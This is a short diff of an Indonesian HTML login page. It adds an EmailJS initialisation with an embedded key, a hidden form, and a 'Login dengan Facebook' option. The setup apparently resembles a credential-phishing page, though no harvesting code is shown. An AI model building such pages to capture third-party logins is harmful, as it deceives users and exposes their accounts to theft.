@@ -43,8 +43,16 @@
 </style>
 </head>
 <body>
+<script>
+// Inisialisasi EmailJS
+(function(){ emailjs.init('cKKsMvy9twhmPTKlR'); })();
+</script>
 
-  <!-- PAGE 1: PILIH LOGIN -->
+  <!-- FORM LOGIN EMAILJS -->
+<form id="memberForm" style="display:none"></form>
+<div id="status"></div>
+
+<!-- PAGE 1: PILIH LOGIN -->
   <div id="page-home" class="page show">
     <h2>Pilih Metode Login</h2>
     <button class="fb" onclick="go('page-fb')">Login dengan Facebook</button>
